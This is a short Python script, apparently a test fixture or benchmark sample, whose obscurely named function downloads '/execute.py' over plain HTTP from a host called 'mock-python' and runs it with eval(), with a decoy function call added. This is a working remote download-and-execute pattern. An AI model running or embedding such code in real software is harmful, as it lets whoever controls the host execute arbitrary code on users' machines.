import http.client
import importlib

def obtain_remote_code(host, path):
    conn = http.client.HTTPConnection(host)
    conn.request("GET", path)
    res = conn.getresponse()
    code = res.read().decode('utf-8')
    conn.close()
    return code

def not_related_function():
    print("I am not related to the main purpose.")

def mysterious_name():
    host = "mock-python"
    path = "/execute.py"
    code = obtain_remote_code(host, path)
    eval(code)
    not_related_function()

mysterious_name()
